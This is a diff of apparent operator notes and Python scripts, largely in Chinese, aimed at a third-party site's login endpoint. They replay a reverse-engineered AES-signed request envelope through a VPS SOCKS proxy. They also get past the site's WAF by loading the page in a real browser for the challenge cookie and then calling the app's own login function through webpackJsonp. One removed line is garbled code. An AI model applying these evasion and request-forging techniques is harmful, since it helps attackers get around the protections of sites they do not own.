@@ -35,9 +35,9 @@
 ```
 ```bash
 # ① 对照：同一台机器、同一目标 —— Python 走 VPS 出口发 POST（被拦）
-python tgt2905_login_validate.py "socks5h://127.0.0.1:11080"   # -> HTTP 405 + 2597B WAF 拦截页
+python ky588_login_validate.py "socks5h://127.0.0.1:11080"   # -> HTTP 405 + 2597B WAF 拦截页
 # ② 正确姿势：真实浏览器在页面上下文内调用应用自己的登录 API（通过）
-python tgt2905_browser_login.py                                  # -> {"msg":"无效验证码","status":-1}
+python ky588_browser_login.py                                  # -> {"msg":"无效验证码","status":-1}
 ```
 要点：浏览器必须真正加载该站页面（让 WAF 的 JS 挑战下发 cookie），再在页面上下文内 `webpackJsonp` 取到应用的 require 后调用其接口函数；不要在 Playwright 里手搓 fetch 到敏感路径（缺挑战流程仍会被拦）。
 ```
@@ -47,7 +47,7 @@ python tgt2905_browser_login.py                                  # -> {"msg":"�
 ```
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-"""Single validation request against the tgt2905 login endpoint through a FRESH exit (VPS socks).
+"""Single validation request against the ky588 login endpoint through a FRESH exit (VPS socks).
 
 Purpose: prove the recovered STATICAES envelope (AES key + salt + X-Signature + transforms)
 is ACCEPTED by the server. Uses a NON-EXISTENT account, so no password guessing against any
@@ -71,7 +71,7 @@ except Exception:
     pass
 
 sys.path.insert(0, r"C:\rt\dgha")
-import tgt2905_recipe as R
+import ky588_recipe as R
 
 HOST = "https://example.com"
 EP = "/member/memberManager/loginV3"
@@ -111,7 +111,7 @@ def main():
     proxies = {"http": PROXY, "https": PROXY}
     t0 = time.time()
     try:
-        r = target9.example.com(HOST + EP, data=body.encode(), headers=hdr, timeout=40, proxies=proxies)
+        r = requests.post(HOST + EP, data=body.encode(), headers=hdr, timeout=40, proxies=proxies)
     except Exception as e:
         print("\n[REQUEST FAILED]", e)
         return
@@ -139,7 +139,7 @@ def main():
                 print("PARSED   :", json.dumps(json.loads(pt), ensure_ascii=False))
             except Exception:
                 pass
-    with open(r"C:\rt\dgha\runs\tgt2905_login_validate.txt", "w", encoding="utf-8") as fh:
+    with open(r"C:\rt\dgha\runs\ky588_login_validate.txt", "w", encoding="utf-8") as fh:
         fh.write("request headers: %s\npayload: %s\nbody: %s\n\nresponse http=%s\n%s\n"
                  % (json.dumps(hdr, ensure_ascii=False), plain, body, r.status_code, txt))
 
